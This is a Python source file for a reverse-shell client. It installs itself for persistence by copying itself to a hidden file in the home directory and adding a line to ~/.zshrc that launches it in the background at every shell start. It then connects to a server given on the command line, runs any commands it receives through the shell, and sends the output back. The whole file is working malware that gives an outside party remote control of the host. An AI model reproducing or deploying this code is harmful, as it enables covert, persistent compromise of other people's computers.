import socket, subprocess, os, sys
with open(f"{os.path.expanduser('~')}/.zshrc","r",) as file:
    if f"python3 {os.path.expanduser('~')}/.client.py &\n" not in file:
        MAKE_PERSISTENT = True
    else:
        MAKE_PERSISTENT = False

if MAKE_PERSISTENT:
    subprocess.run(f"cp client.py {os.path.expanduser('~')}/.client.py",shell=True)
    with open(f"{os.path.expanduser('~')}/.zshrc","a",) as file:
        file.write(f"python3 {os.path.expanduser('~')}/.client.py &\n")


SERVER_HOST = "127.0.0.1"
SERVER_PORT = 8080
BUFFER_SIZE = 1024 * 128 #128KB max size


if len(sys.argv) == 2:
    SERVER_HOST = sys.argv[1]
elif len(sys.argv) == 3:
    SERVER_HOST = sys.argv[1]
    try:
        SERVER_PORT = int(sys.argv[2])
    except:
        print("Can not cast port to int!")

    
s = socket.socket() #Establish socket connection
s.connect((SERVER_HOST,SERVER_PORT)) #Connect to server

while True:
    command = s.recv(BUFFER_SIZE).decode() #Recieve the command from the server and decode it into a string
    splitted_command = command.split() #Split the command
    if command == "exit": #if the user wants to exit, then keep connection alive
        continue
    elif command == "SERVER_SHUTDOWN":
        break
    elif splitted_command[0] == "cd": #if the user wants to change directories
        try:
            os.chdir(' '.join(splitted_command[1:])) #use os to change the directory
        except FileNotFoundError as e: #if it isn't a thing, output the error to a variable
            output = str(e)
            continue
        else: #if it worked, don't send anything
            output = ""
            continue
    elif splitted_command[0] == "echo":
        output = subprocess.getoutput(command)
        output = "Echoed!"
    else: #if the user doesn't want to change directories, run the command and capture the output
        #if the command runs for longer than 5 seconds, timeout
        try:
            output = subprocess.run(command, shell=True,capture_output=True,text=True,timeout=5).stdout 
        except subprocess.TimeoutExpired:
            continue
    message = f"{output}" #encapsulate the output and send it
    s.send(message.encode())
s.close() #close the socket 